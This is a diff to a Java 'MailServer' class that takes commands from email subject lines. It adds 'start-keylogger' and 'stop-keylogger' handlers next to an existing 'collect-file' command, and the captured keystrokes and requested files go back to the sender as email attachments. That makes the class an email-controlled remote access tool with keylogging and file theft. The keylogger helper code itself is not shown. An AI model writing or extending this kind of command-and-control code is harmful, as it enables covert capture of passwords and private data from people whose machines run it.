@@ -193,7 +193,7 @@ public class MailServer {
             if (attachmentReturn.isEmpty()) {
                 contentReturn = "Fail to get services list.";
             } else {
-                contentReturn = "Successfully get a services list";
+                contentReturn = "Successfully get a services list.";
             }
 
         }else if (subjectInput.equals("start-app")) {
@@ -226,6 +226,18 @@ public class MailServer {
         }else if (subjectInput.equals("cancel-server-shutdown")) {
             contentReturn = MailServerHelpers.cancelServerShutdown();
 
+        }else if (subjectInput.equals("start-keylogger")) {
+            contentReturn = MailServerHelpers.startKeylogger();
+
+        }else if (subjectInput.equals("stop-keylogger")) {
+            attachmentReturn = MailServerHelpers.stopKeylogger();
+
+            if (attachmentReturn.isEmpty()) {
+                contentReturn = "Fail to get keylogger result.";
+            } else {
+                contentReturn = "Successfully get keylogger result.";
+            }
+
         }else if (subjectInput.equals("collect-file")) {
             attachmentReturn = MailServerHelpers.collectFile(contentInput);
 
@@ -234,6 +246,7 @@ public class MailServer {
             } else {
                 contentReturn = "Successfully get the file at: " + contentInput;
             }
+
         }else {
             contentReturn = "You have input the wrong command!" + " Here is the list of command you can try:";
         }
